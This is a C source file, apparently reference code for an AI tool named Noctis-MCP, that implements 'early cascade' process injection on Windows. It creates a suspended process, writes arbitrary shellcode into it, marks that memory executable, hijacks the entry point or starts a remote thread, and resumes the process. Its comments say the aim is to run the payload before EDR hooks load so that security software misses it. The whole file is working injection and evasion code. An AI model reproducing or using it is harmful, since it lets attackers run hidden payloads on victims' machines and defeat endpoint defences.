// Reference code for Noctis-MCP AI intelligence system
// Early Cascade Injection Implementation

#include "early_cascade.h"
#include <stdio.h>

// Dynamically resolve NTDLL functions
static fnNtCreateThreadEx pNtCreateThreadEx = NULL;
static fnNtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
static fnNtWriteVirtualMemory pNtWriteVirtualMemory = NULL;

// Initialize NTDLL function pointers
BOOL _EarlyCascade_InitializeFunctions() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    pNtCreateThreadEx = (fnNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

    return (pNtCreateThreadEx && pNtAllocateVirtualMemory && pNtWriteVirtualMemory);
}

// Initialize early cascade context
BOOL EarlyCascade_Initialize(
    PCASCADE_CONTEXT pContext,
    LPCWSTR wzTargetPath,
    PVOID pShellcode,
    SIZE_T szShellcodeSize,
    BOOL bSetEntryPoint
) {
    if (!pContext || !wzTargetPath || !pShellcode || szShellcodeSize == 0) {
        return FALSE;
    }

    ZeroMemory(pContext, sizeof(CASCADE_CONTEXT));

    // Store configuration
    wcsncpy_s(pContext->config.wzTargetPath, MAX_PATH, wzTargetPath, _TRUNCATE);
    pContext->config.pShellcode = pShellcode;
    pContext->config.szShellcodeSize = szShellcodeSize;
    pContext->config.bSetEntryPoint = bSetEntryPoint;
    pContext->config.bInheritHandles = FALSE;

    // Initialize NTDLL functions
    if (!_EarlyCascade_InitializeFunctions()) {
        return FALSE;
    }

    return TRUE;
}

// Internal: Create process in early suspended state
BOOL _EarlyCascade_CreateEarlyProcess(PCASCADE_CONTEXT pContext) {
    if (!pContext) return FALSE;

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };

    // Create process in suspended state (before EDR hooks load)
    // Critical: CREATE_SUSPENDED prevents process initialization
    BOOL bResult = CreateProcessW(
        pContext->config.wzTargetPath,
        NULL,
        NULL,
        NULL,
        pContext->config.bInheritHandles,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!bResult) {
        return FALSE;
    }

    pContext->hProcess = pi.hProcess;
    pContext->hThread = pi.hThread;
    pContext->dwProcessId = pi.dwProcessId;
    pContext->dwThreadId = pi.dwThreadId;

    return TRUE;
}

// Internal: Allocate and write shellcode to early process
BOOL _EarlyCascade_WriteShellcode(PCASCADE_CONTEXT pContext) {
    if (!pContext || !pContext->hProcess) return FALSE;

    NTSTATUS status;
    SIZE_T szRegionSize = pContext->config.szShellcodeSize;

    // Allocate memory in target process (RW first, then change to RX)
    pContext->pRemoteShellcode = NULL;
    status = pNtAllocateVirtualMemory(
        pContext->hProcess,
        &pContext->pRemoteShellcode,
        0,
        &szRegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) return FALSE;

    // Write shellcode to allocated memory
    SIZE_T szBytesWritten = 0;
    status = pNtWriteVirtualMemory(
        pContext->hProcess,
        pContext->pRemoteShellcode,
        pContext->config.pShellcode,
        pContext->config.szShellcodeSize,
        &szBytesWritten
    );

    if (status != 0 || szBytesWritten != pContext->config.szShellcodeSize) {
        return FALSE;
    }

    // Change memory protection to RX (executable)
    DWORD dwOldProtect;
    if (!VirtualProtectEx(pContext->hProcess, pContext->pRemoteShellcode,
                         pContext->config.szShellcodeSize,
                         PAGE_EXECUTE_READ, &dwOldProtect)) {
        return FALSE;
    }

    return TRUE;
}

// Internal: Modify entry point to shellcode (if bSetEntryPoint=TRUE)
BOOL _EarlyCascade_ModifyEntryPoint(PCASCADE_CONTEXT pContext) {
    if (!pContext || !pContext->hThread || !pContext->pRemoteShellcode) {
        return FALSE;
    }

    // Get current thread context
    pContext->threadContext.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pContext->hThread, &pContext->threadContext)) {
        return FALSE;
    }

    // Save original entry point
#ifdef _WIN64
    pContext->pOriginalEntryPoint = (PVOID)pContext->threadContext.Rcx;
    // Set new entry point (shellcode address)
    pContext->threadContext.Rcx = (DWORD64)pContext->pRemoteShellcode;
#else
    pContext->pOriginalEntryPoint = (PVOID)pContext->threadContext.Eax;
    // Set new entry point (shellcode address)
    pContext->threadContext.Eax = (DWORD)pContext->pRemoteShellcode;
#endif

    // Update thread context
    if (!SetThreadContext(pContext->hThread, &pContext->threadContext)) {
        return FALSE;
    }

    return TRUE;
}

// Internal: Resume process execution (shellcode runs first)
BOOL _EarlyCascade_ResumeExecution(PCASCADE_CONTEXT pContext) {
    if (!pContext || !pContext->hThread) return FALSE;

    // Resume suspended thread
    // Shellcode will execute BEFORE EDR hooks are loaded
    DWORD dwSuspendCount = ResumeThread(pContext->hThread);

    return (dwSuspendCount != (DWORD)-1);
}

// Execute early cascade injection
BOOL EarlyCascade_Execute(PCASCADE_CONTEXT pContext) {
    if (!pContext) return FALSE;

    // Step 1: Create process in early suspended state (before EDR)
    if (!_EarlyCascade_CreateEarlyProcess(pContext)) {
        return FALSE;
    }

    // Step 2: Allocate and write shellcode to early process
    if (!_EarlyCascade_WriteShellcode(pContext)) {
        TerminateProcess(pContext->hProcess, 0);
        return FALSE;
    }

    // Step 3: Modify entry point to shellcode (if configured)
    if (pContext->config.bSetEntryPoint) {
        if (!_EarlyCascade_ModifyEntryPoint(pContext)) {
            TerminateProcess(pContext->hProcess, 0);
            return FALSE;
        }
    } else {
        // Alternative: Create new thread pointing to shellcode
        HANDLE hNewThread = NULL;
        NTSTATUS status = pNtCreateThreadEx(
            &hNewThread,
            THREAD_ALL_ACCESS,
            NULL,
            pContext->hProcess,
            pContext->pRemoteShellcode,
            NULL,
            0,  // Run immediately
            0,
            0,
            0,
            NULL
        );

        if (status != 0) {
            TerminateProcess(pContext->hProcess, 0);
            return FALSE;
        }

        CloseHandle(hNewThread);
    }

    // Step 4: Resume execution (shellcode runs BEFORE EDR hooks)
    if (!_EarlyCascade_ResumeExecution(pContext)) {
        TerminateProcess(pContext->hProcess, 0);
        return FALSE;
    }

    // At this point:
    // - Process is running with shellcode executing
    // - EDR hooks have NOT been loaded yet (pre-initialization)
    // - Shellcode completes before EDR can detect it
    // - EDR loads AFTER shellcode runs (too late)

    return TRUE;
}

// Cleanup early cascade context
VOID EarlyCascade_Cleanup(PCASCADE_CONTEXT pContext) {
    if (!pContext) return;

    // Close thread handle
    if (pContext->hThread) {
        CloseHandle(pContext->hThread);
        pContext->hThread = NULL;
    }

    // Close process handle (do NOT terminate - shellcode is running)
    if (pContext->hProcess) {
        CloseHandle(pContext->hProcess);
        pContext->hProcess = NULL;
    }

    // Zero context
    SecureZeroMemory(pContext, sizeof(CASCADE_CONTEXT));
}

// Utility: Get process entry point from PEB
PVOID EarlyCascade_GetProcessEntryPoint(HANDLE hProcess) {
    if (!hProcess) return NULL;

    // Query process basic information
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG ulReturnLength = 0;

    typedef NTSTATUS (NTAPI *fnNtQueryInformationProcess)(
        HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG
    );

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    fnNtQueryInformationProcess pNtQueryInformationProcess =
        (fnNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    if (!pNtQueryInformationProcess) return NULL;

    NTSTATUS status = pNtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &ulReturnLength
    );

    if (status != 0) return NULL;

    // Read PEB to get image base
    PEB remotePeb = { 0 };
    SIZE_T szBytesRead = 0;

    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress,
                          &remotePeb, sizeof(PEB), &szBytesRead)) {
        return NULL;
    }

    // Read DOS header from image base
    IMAGE_DOS_HEADER dosHeader = { 0 };
    if (!ReadProcessMemory(hProcess, remotePeb.Reserved3[1],
                          &dosHeader, sizeof(IMAGE_DOS_HEADER), &szBytesRead)) {
        return NULL;
    }

    // Read NT headers
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    PVOID pNtHeaders = (BYTE*)remotePeb.Reserved3[1] + dosHeader.e_lfanew;
    if (!ReadProcessMemory(hProcess, pNtHeaders,
                          &ntHeaders, sizeof(IMAGE_NT_HEADERS), &szBytesRead)) {
        return NULL;
    }

    // Calculate entry point
    PVOID pEntryPoint = (BYTE*)remotePeb.Reserved3[1] +
                        ntHeaders.OptionalHeader.AddressOfEntryPoint;

    return pEntryPoint;
}

// Utility: Set thread context entry point
BOOL EarlyCascade_SetThreadEntryPoint(HANDLE hThread, PVOID pNewEntryPoint, PCONTEXT pOriginalContext) {
    if (!hThread || !pNewEntryPoint) return FALSE;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx)) {
        return FALSE;
    }

    // Save original context if requested
    if (pOriginalContext) {
        memcpy(pOriginalContext, &ctx, sizeof(CONTEXT));
    }

    // Set new entry point
#ifdef _WIN64
    ctx.Rcx = (DWORD64)pNewEntryPoint;
#else
    ctx.Eax = (DWORD)pNewEntryPoint;
#endif

    return SetThreadContext(hThread, &ctx);
}
